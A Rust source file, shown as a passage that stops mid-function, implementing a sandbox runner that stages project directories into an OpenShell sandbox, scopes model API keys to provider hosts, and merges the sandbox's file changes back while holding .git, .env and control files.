//! The built-in `openshell` runner: a sandbox on an NVIDIA OpenShell gateway
//! (`specs/sandbox.md` §4.5).
//!
//! OpenShell doesn't mount host directories (its operator has to turn bind mounts on, and
//! it warns they bypass its isolation), and it injects credentials itself. So a run is a
//! session, not one argv: [`begin`] creates a sandbox from the image, uploads a staged copy
//! of each place the command sees, and attaches a provider for each model key; the caller
//! runs the argv it returns (`openshell sandbox exec`); [`end`] downloads what the command
//! could write, copies its changes back, and deletes the sandbox and its providers.
//!
//! Copying back is a merge: a file comes back only when the sandbox changed it and the host
//! didn't. A control file, a `.env` file or `.git` never comes back; a change to one is
//! reported. A file both sides changed is kept aside, and the run says where.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};
use std::time::Duration;

use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::error::{Error, Result};
use crate::process::Limits;
use crate::sandbox::{Mount, Run, SANDBOX_ENV_DIR};

fn err(msg: impl Into<String>) -> Error {
    Error::Profile(msg.into())
}

/// The model keys an OpenShell provider holds for a run: the variable, the provider host,
/// and how the key goes in a request.
pub const KEY_ROUTES: &[(&str, &str, &str, &str)] = &[
    // (route, variable, host, auth style)
    ("anthropic", "ANTHROPIC_API_KEY", "api.anthropic.com", "header"),
    ("openai", "OPENAI_API_KEY", "api.openai.com", "bearer"),
];

/// Directories that aren't uploaded, at any depth: dependencies and build output a sandbox
/// rebuilds for its own platform. What the sandbox puts there isn't copied back either.
/// `target` counts only beside a `Cargo.toml`, `venv` only when it's a virtualenv.
const NOT_UPLOADED: &[&str] = &["node_modules", ".venv", "__pycache__"];
/// The most files staged for one place.
const MAX_FILES: usize = 100_000;
/// Text files in a config root or `HOME` this size or smaller get their host paths rewritten.
const MAX_REWRITE: u64 = 4 << 20;

/// One host path the command sees, uploaded to `inside`.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq)]
pub struct Place {
    pub host: PathBuf,
    /// Its path inside the sandbox, set by [`begin`].
    #[serde(default)]
    pub inside: String,
    /// The command may write it; its changes come back when `copy_back` is set.
    pub writable: bool,
    pub copy_back: bool,
    /// A config root or `HOME`: host paths in its text files are rewritten to the sandbox's.
    pub rewrite: bool,
    /// Paths under it that aren't uploaded and never come back: `.env` files, hlock's own
    /// config roots, places of their own.
    pub skip: Vec<PathBuf>,
    /// Paths under it that are uploaded but never come back (control files, `.git`): a
    /// change to one is reported.
    pub keep: Vec<PathBuf>,
    /// The place it's inside, when it's nested in another.
    pub parent: Option<usize>,
    /// The project itself: its control files at the top never come back.
    #[serde(default)]
    pub project: bool,
}

/// A run on OpenShell, from the plan [`plan`] makes to what [`end`] cleans up.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq)]
pub struct Session {
    /// The sandbox's name (and the prefix of its providers'): `hlock-<id>`.
    pub name: String,
    pub kind: String,
    pub image: String,
    /// The OpenShell policy file (`[sandbox] profile`), hlock's checked copy.
    pub policy: Option<PathBuf>,
    pub places: Vec<Place>,
    pub argv: Vec<String>,
    pub cwd: PathBuf,
    /// The command's `HOME`, on the host.
    pub home: PathBuf,
    /// The variables the command gets inside; their values are in the environment passed
    /// to [`begin`], never here.
    pub env_names: Vec<String>,
    /// `proxy`: model keys go to OpenShell providers; `env`: into the command's environment.
    pub secrets: String,
    pub tty: bool,
    /// The project, for kept-aside conflicts.
    pub project: PathBuf,
    // set by `begin`
    #[serde(default)]
    pub dir: Option<PathBuf>,
    #[serde(default)]
    pub workdir: String,
    #[serde(default)]
    pub providers: Vec<String>,
    #[serde(default)]
    pub profiles: Vec<String>,
    #[serde(default)]
    pub created: bool,
    /// The image has `timeout`, so a run's deadline also stops it inside (one exec can't
    /// signal another's processes).
    #[serde(default)]
    pub has_timeout: bool,
    #[serde(default)]
    pub notes: Vec<String>,
}

/// What [`begin`] hands back: the command to run (`openshell sandbox exec …`) and the
/// environment to start it in ([`cli_env`], without the keys).
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct Started {
    pub argv: Vec<String>,
    pub env: BTreeMap<String, String>,
    /// The deadline inside the sandbox, in seconds (0: none).
    pub deadline: u64,
    pub session: Session,
}

impl Started {
    /// Whether the command was stopped by the deadline inside: `timeout -s KILL` exits 137
    /// (124 for another signal), at or after it.
    pub fn stopped_inside(&self, code: Option<i32>, elapsed: Duration) -> bool {
        self.deadline > 0 && matches!(code, Some(124 | 137)) && elapsed.as_secs() + 1 >= self.deadline
    }
}

/// The places a run sees, from its mounts: each read-write mount nested in a read-only one
/// (or in nothing) is a place; read-only mounts inside a writable place are kept from
/// coming back, and a covering mount (hlock's empty file over a `.env`) is skipped.
pub fn places(mounts: &[Mount], run: &Run, project: &Path) -> Vec<Place> {
    let mut out: Vec<Place> = Vec::new();
    let nearest = |out: &[Place], p: &Path| -> Option<usize> {
        out.iter().enumerate().filter(|(_, x)| p != x.host && p.starts_with(&x.host)).max_by_key(|(_, x)| x.host.components().count()).map(|(i, _)| i)
    };
    for m in mounts {
        if m.src != m.dst {
            if let Some(i) = nearest(&out, &m.dst) {
                out[i].skip.push(m.dst.clone());
            }
            continue;
        }
        match nearest(&out, &m.dst) {
            Some(i) if m.readonly => {
                if out[i].writable {
                    out[i].keep.push(m.dst.clone());
                }
            }
            parent => {
                if let Some(i) = parent {
                    out[i].skip.push(m.dst.clone());
                }
                let own = Some(&m.dst) == std::fs::canonicalize(&run.home).ok().as_ref() || run.config.as_ref().and_then(|c| std::fs::canonicalize(c).ok()).as_ref() == Some(&m.dst);
                out.push(Place { host: m.dst.clone(), writable: !m.readonly, copy_back: !m.readonly && !own, rewrite: own, parent, ..Default::default() });
            }
        }
    }
    // hlock's own state under .hlock: never uploaded, except the places above
    for p in out.iter_mut() {
        let env = p.host.join(SANDBOX_ENV_DIR);
        if env.exists() && !p.skip.contains(&env) {
            p.skip.push(env);
        }
        // in the project, what decides what runs next on the host never comes back, even
        // when the run creates it (a .git with hooks, an .hlock, an .envrc)
        // a place inside the project (launched from a subdirectory) is the project's too
        p.project = p.writable && p.host.starts_with(project);
        if p.writable && p.host == project {
            for d in [".git", ".hlock"] {
                let d = p.host.join(d);
                if !p.keep.contains(&d) {
                    p.keep.push(d);
                }
            }
        }
    }
    out
}

/// The session a run starts as: no side effects until [`begin`].
pub fn plan(sb: &crate::sandbox::Sandbox, run: &Run, mounts: &[Mount], id: &str, env_names: Vec<String>) -> Result<Session> {
    let image = if run.kind == "graders" { sb.spec.grader_image.as_ref().or(sb.spec.image.as_ref()) } else { sb.spec.image.as_ref() };
    let image = image.ok_or_else(|| err("the openshell sandbox has no image"))?.clone();
    // the image runs its own programs: a host path that isn't uploaded means its name there
    let mut argv = run.argv.clone();
    if let Some(a0) = argv.first_mut() {
        *a0 = crate::sandbox::docker_program(a0, mounts);
    }
    Ok(Session {
        name: format!("hlock-{id}"),
        kind: run.kind.clone(),
        image,
        policy: sb.profile_copy.clone(),
        places: places(mounts, run, &std::fs::canonicalize(&sb.project).unwrap_or_else(|_| sb.project.clone())),
        argv,
        cwd: std::fs::canonicalize(&run.cwd).unwrap_or_else(|_| run.cwd.clone()),
        home: std::fs::canonicalize(&run.home).unwrap_or_else(|_| run.home.clone()),
        // under proxy, the providers hold the keys: the command never gets a value
        env_names: env_names.into_iter().filter(|k| k != "HOME" && !(sb.spec.secrets == "proxy" && crate::sandbox::PROVIDER_VARS.contains(&k.as_str()))).collect(),
        secrets: sb.spec.secrets.clone(),
        tty: run.tty,
        project: std::fs::canonicalize(&sb.project).unwrap_or_else(|_| sb.project.clone()),
        ..Default::default()
    })
}

/// How the session's argv reads before it starts (for `--dry-run`).
pub fn preview(s: &Session) -> Vec<String> {
    let mut a: Vec<String> = ["openshell", "sandbox", "exec", &s.name, "--"].iter().map(|x| x.to_string()).collect();
    a.extend(s.argv.iter().cloned());
    a
}

// --------------------------------------------------------------------------- //
// The openshell CLI
// --------------------------------------------------------------------------- //

/// What the openshell CLI itself runs with, from the runner's environment (which never holds
/// the command's variables): its own (`PATH`, `OPENSHELL_*`, …), the real `HOME` and
/// `XDG_CONFIG_HOME`, so it finds its gateway, and the model keys only when `keys` (a
/// provider reads them).
pub fn cli_env(env: &BTreeMap<String, String>, keys: bool) -> BTreeMap<String, String> {
    env.iter()
        .filter(|(k, _)| crate::sandbox::runner_keeps(k) || matches!(k.as_str(), "HOME" | "XDG_CONFIG_HOME") || keys && KEY_ROUTES.iter().any(|(_, v, _, _)| v == k))
        .map(|(k, v)| (k.clone(), v.clone()))
        .collect()
}

/// Run `openshell` with `args`, in [`cli_env`] of `env`.
fn os(args: &[&str], env: &BTreeMap<String, String>, secs: u64) -> Result<crate::process::Output> {
    let mut c = std::process::Command::new("openshell");
    c.args(args).env_clear().envs(cli_env(env, args.first() == Some(&"provider"))).stdin(std::process::Stdio::null());
    // not stopped by a Ctrl-C: a session that began must end (its providers hold keys)
    crate::process::run(c, &Limits { kill_leftovers: false, untracked: true, ..Limits::timeout(Duration::from_secs(secs)) }).map_err(|e| err(format!("cannot run openshell: {e}")))
}

fn os_ok(what: &str, args: &[&str], env: &BTreeMap<String, String>, secs: u64) -> Result<String> {
    let out = os(args, env, secs)?;
    if !out.success {
        let text = out.text();
        let tail: Vec<&str> = text.lines().filter(|l| !l.trim().is_empty()).collect();
        let tail = tail[tail.len().saturating_sub(8)..].join("\n");
        return Err(err(format!("openshell couldn't {what}{}:\n{tail}", if out.timed_out { " (timed out)" } else { "" })));
    }
    Ok(out.stdout_text())
}

/// `openshell sandbox exec` with no terminal and no login shell, for hlock's own probes.
fn probe(s: &Session, script: &str, args: &[&str], env: &BTreeMap<String, String>) -> Result<String> {
    let mut a = vec!["sandbox", "exec", &s.name, "--no-tty", "--no-login-shell", "--", "/bin/sh", "-c", script, "sh"];
    a.extend(args);
    os_ok("run a command in the sandbox", &a, env, 120)
}

// --------------------------------------------------------------------------- //
// Begin
// --------------------------------------------------------------------------- //

/// Start the session: create the sandbox, upload its places, attach providers. Returns the
/// command to run; `timeout` (seconds) is when the run's caller gives up on it, and the
/// command is stopped inside a little before. On an error, whatever was created is
/// removed again.
pub fn begin(mut s: Session, env: &BTreeMap<String, String>, command_env: &BTreeMap<String, String>, timeout: Option<u64>) -> Result<Started> {
    match start(&mut s, env, command_env, timeout) {
        Ok((argv, deadline)) => Ok(Started { argv, env: cli_env(env, false), deadline, session: s }),
        Err(e) => {
            cleanup(&s, env);
            Err(e)
        }
    }
}

fn start(s: &mut Session, env: &BTreeMap<String, String>, command_env: &BTreeMap<String, String>, timeout: Option<u64>) -> Result<(Vec<String>, u64)> {
    let status = os(&["status"], env, 30)?;
    if !status.stdout_text().contains("Connected") {
        return Err(err("the OpenShell gateway isn't connected (openshell status): start it, or select one with openshell gateway select"));
    }
    sweep(env);
    let keys: Vec<(&str, &str, &str, &str)> = if s.secrets == "proxy" && s.kind != "graders" {
        KEY_ROUTES.iter().copied().filter(|(_, var, _, _)| env.get(*var).is_some_and(|v| !v.is_empty())).collect()
    } else {
        vec![]
    };
    if s.secrets == "proxy" && s.kind == "agent" && keys.is_empty() {
        return Err(err("the sandbox holds provider keys in OpenShell providers (secrets = \"proxy\"), but neither ANTHROPIC_API_KEY nor OPENAI_API_KEY is set; export one (a subscription login can't be held for you)"));
    }
    let dir = private_dir(&s.name)?;
    s.dir = Some(dir.clone());

    let mut create = vec!["sandbox", "create", "--name", &s.name, "--from", &s.image, "--detach", "--no-auto-providers", "--no-tty"];
    let policy = s.policy.as_ref().map(|p| p.to_string_lossy().into_owned());
    if let Some(p) = &policy {
        create.extend(["--policy", p]);
    }
    s.created = true;
    os_ok("create the sandbox", &create, env, 900)?;
    wait_ready(s, env)?;
    s.workdir = probe(s, "pwd", &[], env)?.trim().to_string();
    if !s.workdir.starts_with('/') {
        return Err(err(format!("the sandbox's working directory {:?} isn't a path", s.workdir)));
    }
    s.has_timeout = !probe(s, "command -v timeout || true", &[], env)?.trim().is_empty();

    // where each place goes inside: the project at <workdir>/<its name>, others beside it
    for i in 0..s.places.len() {
        let inside = match s.places[i].parent {
            Some(p) => {
                let rel = s.places[i].host.strip_prefix(&s.places[p].host).unwrap_or(Path::new("")).to_string_lossy().into_owned();
                format!("{}/{rel}", s.places[p].inside)
            }
            None if s.places[i].host == s.project => format!("{}/{}", s.workdir, base(&s.places[i].host)),
            None => format!("{}/.hlock/{i}-{}", s.workdir, base(&s.places[i].host)),
        };
        s.places[i].inside = inside;
    }
    let pairs = pairs(s);
    for i in 0..s.places.len() {
        let staged = dir.join("stage").join(i.to_string()).join(base_inside(&s.places[i].inside));
        let manifest = stage(&s.places[i], &staged, &pairs)?;
        write_manifest(&dir.join(format!("baseline-{i}.json")), &manifest)?;
        let parent = parent_inside(&s.places[i].inside);
        os_ok(&format!("upload {}", s.places[i].host.display()), &["sandbox", "upload", &s.name, &staged.to_string_lossy(), &parent, "--no-git-ignore"], env, 1800)?;
    }

    // the command's environment, in a file only it reads (exec's --env shows on the host)
    let mut file = String::new();
    for k in &s.env_names {
        if let Some(v) = command_env.get(k) {
            file.push_str(&format!("export {k}={}\n", crate::fsutil::shell_quote(&translate(v, &pairs))));
        }
    }
    file.push_str(&format!("export HOME={}\n", crate::fsutil::shell_quote(&translate(&s.home.to_string_lossy(), &pairs))));
    file.push_str(&format!("export {}=1\n", crate::sandbox::IN_SANDBOX));
    let session_dir = dir.join("stage").join("session").join(".hlock-session");
    std::fs::create_dir_all(&session_dir)?;
    crate::fsutil::write_private(&session_dir.join("env"), file)?;
    os_ok("upload the session's environment", &["sandbox", "upload", &s.name, &session_dir.to_string_lossy(), &s.workdir, "--no-git-ignore"], env, 120)?;
    let _ = std::fs::remove_file(session_dir.join("env"));

    let argv: Vec<String> = s.argv.iter().map(|a| translate(a, &pairs)).collect();
    if !keys.is_empty() {
        attach_keys(s, &keys, &argv, env)?;
    }

    let cwd = translate(&s.cwd.to_string_lossy(), &pairs);
    // the deadline inside: a little before the caller's, so nothing still runs when the
    // copy-back starts (stopping the local client doesn't stop it)
    let inside = match timeout {
        Some(t) if s.has_timeout => t.saturating_sub(5).max(1),
        _ => 0,
    };
    let script = "set -a; . \"$0\"; set +a; t=$1; shift; if [ \"$t\" != 0 ]; then exec timeout -s KILL \"$t\" \"$@\"; fi; exec \"$@\"";
    let mut out: Vec<String> = ["openshell", "sandbox", "exec", &s.name, "--workdir", &cwd, if s.tty { "--tty" } else { "--no-tty" }, "--no-login-shell", "--", "/bin/sh", "-c", script].iter().map(|x| x.to_string()).collect();
    out.push(format!("{}/.hlock-session/env", s.workdir));
    out.push(inside.to_string());
    out.extend(argv);
    save(s)?;
    Ok((out, inside))
}

fn wait_ready(s: &Session, env: &BTreeMap<String, String>) -> Result<()> {
    let until = std::time::Instant::now() + Duration::from_secs(300);
    loop {
        let out = os_ok("read the sandbox", &["sandbox", "get", &s.name, "-o", "json"], env, 60)?;
        let v: Value = serde_json::from_str(&out).unwrap_or(Value::Null);
        match v.get("phase").and_then(Value::as_str) {
            Some("Ready") => return Ok(()),
            Some("Error") => {
                let why: Vec<String> = v["conditions"].as_array().into_iter().flatten().filter(|c| c["status"] != "True").map(|c| format!("{}: {}", c["reason"].as_str().unwrap_or(""), c["message"].as_str().unwrap_or(""))).collect();
                return Err(err(format!("the sandbox failed to start ({}){}", why.join("; "), hint(&why.join(" ")))));
            }
            _ if std::time::Instant::now() > until => return Err(err("the sandbox didn't become ready in 5 minutes")),
            _ => std::thread::sleep(Duration::from_millis(500)),
        }
    }
}

/// What to do about a sandbox that didn't start, when hlock knows.
fn hint(why: &str) -> &'static str {
    if why.contains("WorkingDir") {
        "; the image's WORKDIR must be writable by uid 1000: rebuild it with hlock sync --docker --build"
    } else if why.contains("connect to OpenShell server") {
        "; on Docker Desktop, set supervisor_network_mode = \"bridge\" under [openshell.drivers.docker] in the gateway's config, or enable host networking"
    } else {
        ""
    }
}

/// Make a provider for each model key and attach it: OpenShell keeps the key and puts it in
/// requests to its host only, from the harness's own binary; the command sees a placeholder.
fn attach_keys(s: &mut Session, keys: &[(&str, &str, &str, &str)], argv: &[String], env: &BTreeMap<String, String>) -> Result<()> {
    let program = argv.first().cloned().unwrap_or_default();
    // the binary the harness runs as, and its interpreter when it's a script
    let found = probe(s, "p=$(command -v \"$1\") || exit 0; r=$(readlink -f \"$p\"); echo \"$r\"; \
        if [ \"$(head -c 2 \"$r\")\" = '#!' ]; then set -- $(head -n 1 \"$r\" | cut -c 3-); i=$1; [ \"${i##*/}\" = env ] && i=$2; \
        i=$(command -v \"$i\") && readlink -f \"$i\"; fi", &[&program], env)?;
    let binaries: Vec<String> = found.lines().map(str::trim).filter(|l| l.starts_with('/')).map(str::to_string).collect();
    if binaries.is_empty() {
        return Err(err(format!("{program} isn't on the image's PATH, so OpenShell can't let it reach the provider")));
    }
    if binaries.len() > 1 {
        s.notes.push(format!("{} runs on {}, so any program run by that interpreter in the sandbox can use the provider keys", base(Path::new(&binaries[0])), binaries[1]));
    }
    let dir = s.dir.clone().unwrap_or_default();
    for (route, var, host, style) in keys {
        let id = format!("hlock-{route}-{}", &crate::hash::sha256_hex(format!("{host}|{style}|{}", binaries.join("|")).as_bytes())[..10]);
        if !os(&["profile", "describe", &id], env, 60)?.success {
            let yaml = profile_yaml(&id, route, var, host, style, &binaries);
            let file = dir.join(format!("{id}.yaml"));
            std::fs::write(&file, yaml)?;
            os_ok("import a provider profile", &["profile", "import", "--file", &file.to_string_lossy()], env, 60)?;
            s.profiles.push(id.clone());
        }
        let name = format!("{}-{route}", s.name);
        os_ok(&format!("create a provider for {var}"), &["provider", "create", "--name", &name, "--type", &id, "--credential", var], env, 120)?;
        s.providers.push(name.clone());
        save(s)?;
        os_ok(&format!("attach the {route} provider"), &["sandbox", "provider", "attach", &s.name, &name, "--wait", "--timeout", "60"], env, 120)?;
    }
    Ok(())
}

/// An OpenShell provider profile for one model key, scoped to the harness's binaries.
pub fn profile_yaml(id: &str, route: &str, var: &str, host: &str, style: &str, binaries: &[String]) -> String {
    let header = if style == "bearer" { "authorization" } else { "x-api-key" };
    let list = binaries.iter().map(|b| format!("\"{b}\"")).collect::<Vec<_>>().join(", ");
    format!(
        "# Written by hlock for a sandboxed run. The key reaches {host} only, from these binaries.\n\
         id: {id}\ndisplay_name: hlock {route}\ndescription: {route} key for an hlock sandbox\ncategory: inference\ninference_capable: true\n\
         credentials:\n  - name: api_key\n    description: {route} API key\n    env_vars: [{var}]\n    required: true\n    auth_style: {style}\n    header_name: {header}\n\
         endpoints:\n  - host: {host}\n    port: 443\n    protocol: rest\n    access: read-write\n    enforcement: enforce\n\
         binaries: [{list}]\n"
    )
}

/// A directory of hlock's own for the session's staging, 0700.
fn private_dir(name: &str) -> Result<PathBuf> {
    let dir = std::env::temp_dir().join(format!("{name}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    std::fs::create_dir_all(&dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700))?;
    }
    Ok(dir)
}

fn save(s: &Session) -> Result<()> {
    if let Some(d) = &s.dir {
        std::fs::write(d.join("session.json"), serde_json::to_vec_pretty(s)?)?;
    }
    Ok(())
}

fn base(p: &Path) -> String {
    p.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_else(|| "root".into())
}

fn base_inside(p: &str) -> String {
    p.rsplit('/').next().unwrap_or("root").to_string()
}

fn parent_inside(p: &str) -> String {
    match p.rsplit_once('/') {
        Some(("", _)) | None => "/".into(),
        Some((d, _)) => d.into(),
    }
}

// --------------------------------------------------------------------------- //
// Paths: host to sandbox
// --------------------------------------------------------------------------- //

/// Host path → sandbox path, longest first: each top-level place, and its `/private`-less
/// spelling on macOS (`/var` is `/private/var`).
pub fn pairs(s: &Session) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for p in s.places.iter().filter(|p| p.parent.is_none()) {
        let h = p.host.to_string_lossy().into_owned();
        if let Some(short) = h.strip_prefix("/private") {
            if short.starts_with('/') {
                out.push((short.to_string(), p.inside.clone()));
            }
        }
        out.push((h, p.inside.clone()));
    }
    out.sort_by_key(|(h, _)| std::cmp::Reverse(h.len()));
    out
}

/// `s` with each host path in it written as the sandbox's: where a place's path appears as
/// a whole path (followed by `/`, the end, or a character a path doesn't continue with).
pub fn translate(s: &str, pairs: &[(String, String)]) -> String {
    let mut out = String::with_capacity(s.len());
    let mut i = 0;
    'outer: while i < s.len() {
        for (h, inside) in pairs {
            if s[i..].starts_with(h.as_str()) {
                let next = s[i + h.len()..].chars().next();
                let boundary_before = i == 0 || !s[..i].chars().last().is_some_and(|c| c.is_ascii_alphanumeric() || "._-/".contains(c));
                if boundary_before && next.is_none_or(|c| !(c.is_ascii_alphanumeric() || "._-".contains(c))) {
                    out.push_str(inside);
                    i += h.len();
                    continue 'outer;
                }
            }
        }
        let c = s[i..].chars().next().unwrap_or_default();
        out.push(c);
        i += c.len_utf8();
    }
    out
}

// --------------------------------------------------------------------------- //
// Staging and manifests
// --------------------------------------------------------------------------- //

/// One entry of a place, by its path relative to the place.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "lowercase")]
pub enum Entry {
    File { sha256: String, exec: bool },
    Link { target: String },
    Dir,
}

type Manifest = BTreeMap<String, Entry>;

fn write_manifest(p: &Path, m: &Manifest) -> Result<()> {
    std::fs::write(p, serde_json::to_vec(m)?)?;
    Ok(())
}

fn read_manifest(p: &Path) -> Result<Manifest> {
    Ok(serde_json::from_slice(&std::fs::read(p)?)?)
}

/// What one path is on disk, without following a link; `None` when it's missing (or a
/// FIFO, socket or device, which a place doesn't carry).
pub fn entry(p: &Path) -> Option<Entry> {
    let m = std::fs::symlink_metadata(p).ok()?;
    let ft = m.file_type();
    if ft.is_symlink() {
        Some(Entry::Link { target: std::fs::read_link(p).ok()?.to_string_lossy().into_owned() })
    } else if ft.is_dir() {
        Some(Entry::Dir)
    } else if ft.is_file() {
        let bytes = std::fs::read(p).ok()?;
        Some(Entry::File { sha256: crate::hash::sha256_hex(&bytes), exec: exec_bit(&m) })
    } else {
        None
    }
}

#[cfg(unix)]
fn exec_bit(m: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    m.permissions().mode() & 0o111 != 0
}

#[cfg(not(unix))]
fn exec_bit(_: &std::fs::Metadata) -> bool {
    false
}

/// Whether `rel` (a place's relative path) is left out: under a skipped path, or in a
/// directory that isn't uploaded.
fn skipped(place: &Place, rel: &str) -> bool {
    let full = place.host.join(rel);
    place.skip.iter().any(|s| full.starts_with(s)) || rebuilt(place, rel, None)
}

/// Whether `rel` is under a dependency or build directory ([`NOT_UPLOADED`]): a `target`'s
/// `Cargo.toml` or a `venv`'s `pyvenv.cfg` is looked for in the place, and in `also` (the
/// sandbox's copy, where the run may have made them).
fn rebuilt(place: &Place, rel: &str, also: Option<&Path>) -> bool {
    let parts: Vec<&str> = rel.split('/').collect();
    parts.iter().enumerate().any(|(i, c)| {
        let up = parts[..i].join("/");
        let marked = |m: &str| std::iter::once(place.host.as_path()).chain(also).any(|r| r.join(&up).join(m).is_file());
        NOT_UPLOADED.contains(c) || *c == "target" && marked("Cargo.toml") || *c == "venv" && marked("venv/pyvenv.cfg")
    })
}

/// Where `rel` is held from coming back (the path to report), if it is: a kept path and, in
/// the project, any `.git` (its hooks and config run commands) and at any depth a control
/// file's or a `.env` file's name (hlock finds a `harness.toml` by searching up, direnv an
/// `.envrc`).
fn kept(place: &Place, rel: &str) -> Option<PathBuf> {
    let full = place.host.join(rel);
    // a scratch workspace (a trial's, an eval task's) is the task's own: as under docker
    if !place.project {
        return place.keep.iter().find(|k| full.starts_with(k)).cloned();
    }
    let parts: Vec<&str> = rel.split('/').collect();
    if let Some(i) = parts.iter().position(|c| *c == ".git") {
        return Some(place.host.join(parts[..=i].join("/")));
    }
    let name = parts.last().copied().unwrap_or("");
    if crate::sandbox::is_control_name(name) || name == ".env" || name.starts_with(".env.") {
        return Some(full);
    }
    place.keep.iter().find(|k| full.starts_with(k)).cloned()
}

/// The harness's result, which hlock reads as data (the contract's `HLOCK_OUTPUT`): it comes
/// back from under a held `.hlock`, as a plain file only.
fn is_result(rel: &str, e: Option<&Entry>) -> bool {
    rel == ".hlock/result.json" && matches!(e, Some(Entry::File { .. }) | None)
}

/// A link that stays inside its place: a relative target that never climbs above the place's
/// top. Anything else would point the project at files outside it.
fn link_stays_inside(rel: &str, target: &str) -> bool {
    if target.starts_with('/') || target.is_empty() {
        return false;
    }
    // `..` only at the start: after a name, it would climb from wherever that name (maybe
    // another link) points
    let mut depth = rel.matches('/').count() as i64;
    let mut named = false;
    for c in target.split('/') {
        match c {
            "" | "." => {}
            ".." if named => return false,
            ".." => {
                depth -= 1;
                if depth < 0 {
                    return false;
                }
            }
            _ => named = true,
        }
    }
    true
}

/// Every path in a tree (relative, `/`-separated), not descending into links.
fn walk(root: &Path, mut keep: impl FnMut(&str) -> bool) -> Result<Vec<String>> {
    let mut out = Vec::new();
    let mut stack = vec![String::new()];
    while let Some(rel) = stack.pop() {
        let dir = if rel.is_empty() { root.to_path_buf() } else { root.join(&rel) };
        let Ok(rd) = std::fs::read_dir(&dir) else { continue };
        for e in rd.flatten() {
            let name = e.file_name().to_string_lossy().into_owned();
            let r = if rel.is_empty() { name } else { format!("{rel}/{name}") };
            if !keep(&r) {
                continue;
            }
            out.push(r.clone());
            if out.len() > MAX_FILES {
                return Err(err(format!("{} has more than {MAX_FILES} files; that's too many to copy into a sandbox", root.display())));
            }
            if e.file_type().is_ok_and(|t| t.is_dir()) {
                stack.push(r);
            }
        }
    }
    out.sort();
    Ok(out)
}

/// Copy a place into `to` (minus what it skips) and return its manifest. Files are hard
/// links where they can be (the upload only reads them); a config root's text files are
/// rewritten copies.
fn stage(place: &Place, to: &Path, pairs: &[(String, String)]) -> Result<Manifest> {
    let mut m = Manifest::new();
    let meta = std::fs::symlink_metadata(&place.host)?;
    if meta.is_file() {
        if let Some(parent) = to.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::copy(&place.host, to)?;
        if let Some(e) = entry(&place.host) {
            m.insert(String::new(), e);
        }
        return Ok(m);
    }
    std::fs::create_dir_all(to)?;
    for rel in walk(&place.host, |r| !skipped(place, r))? {
        let (src, dst) = (place.host.join(&rel), to.join(&rel));
        let Some(e) = entry(&src) else { continue };
        match &e {
            Entry::Dir => std::fs::create_dir_all(&dst)?,
            Entry::Link { target } => {
                #[cfg(unix)]
                std::os::unix::fs::symlink(target, &dst)?;
            }
            Entry::File { .. } => {
                let rewritten = place.rewrite && std::fs::metadata(&src).is_ok_and(|x| x.len() <= MAX_REWRITE);
                match std::fs::read_to_string(&src).ok().filter(|_| rewritten) {
                    Some(text) => {
                        std::fs::write(&dst, translate(&text, pairs))?;
                        std::fs::set_permissions(&dst, std::fs::metadata(&src)?.permissions())?;
                    }
                    None => {
                        if std::fs::hard_link(&src, &dst).is_err() {
                            std::fs::copy(&src, &dst)?;
                        }
                    }
                }
            }
        }
        m.insert(rel, e);
    }
    Ok(m)
}

// --------------------------------------------------------------------------- //
// End: copy back, clean up
// --------------------------------------------------------------------------- //

/// What came back from one place.
#[derive(Debug, Default, PartialEq)]
pub struct Merge {
    pub added: usize,
    pub changed: usize,
    pub removed: usize,
    /// Changed on both sides: (path, where the sandbox's copy was kept).
    pub conflicts: Vec<(String, Option<PathBuf>)>,
    /// Kept paths (control files, `.git`) the sandbox changed, which didn't come back.
    pub held: Vec<String>,
    /// Paths that couldn't come back, and why.
    pub refused: Vec<(String, String)>,
    /// Top-level entries under dependency and build directories ([`NOT_UPLOADED`]) that
    /// stayed in the sandbox.
    pub left: usize,
}

/// End the session: copy back what each writable place's command changed, then delete the
/// sandbox and its providers. `stopped`: how the caller stopped the command early
/// (`timeout`, `interrupt`). Stopping the local client doesn't stop the command inside, so
/// after an interrupt, or a timeout without `timeout` in the image, it may still be writing:
/// nothing is copied back. Returns what the run should say. Never stops part way: a place
/// that fails is noted, and the sandbox is kept so its files can be got out by hand.
pub fn end(s: &Session, env: &BTreeMap<String, String>, stopped: Option<&str>) -> Result<Vec<String>> {
    let mut notes = s.notes.clone();
    let Some(dir) = s.dir.clone() else {
        cleanup(s, env);
        return Ok(notes);
    };
    let mut failed = false;
    let still_running = match stopped {
        Some("timeout") => !s.has_timeout,
        Some(_) => true,
        None => false,
    };
    if still_running {
        notes.push(format!("the run was {}, and its command may still have been running in the sandbox, so nothing is copied back", if stopped == Some("timeout") { "timed out (the image has no timeout command to stop it inside)" } else { "interrupted" }));
    } else {
        let conflicts = s.project.join(SANDBOX_ENV_DIR).join("conflicts").join(&s.name);
        let named = s.places.iter().filter(|x| x.copy_back).count() > 1;
        for (i, p) in s.places.iter().enumerate().filter(|(_, p)| p.copy_back) {
            let out = dir.join("out").join(i.to_string());
            let copied = (|| -> Result<Merge> {
                os_ok(&format!("download {}", p.inside), &["sandbox", "download", &s.name, &p.inside, &out.to_string_lossy()], env, 1800)?;
                let baseline = read_manifest(&dir.join(format!("baseline-{i}.json")))?;
                merge(p, &baseline, &out, &conflicts.join(i.to_string()))
            })();
            match copied {
                Ok(m) => notes.extend(report(p, &m, named)),
                Err(e) => {
                    failed = true;
                    notes.push(format!("couldn't copy back {}: {e}", p.host.display()));
                }
            }
        }
    }
    // the providers hold keys: detached and deleted whatever happened, before the sandbox
    // goes (OpenShell won't delete one that's attached)
    notes.extend(drop_providers(s, env));
    if failed {
        // the command's variables (keys, under secrets = "env") don't stay with it
        let _ = probe(s, "rm -f \"$1\"", &[&format!("{}/.hlock-session/env", s.workdir)], env);
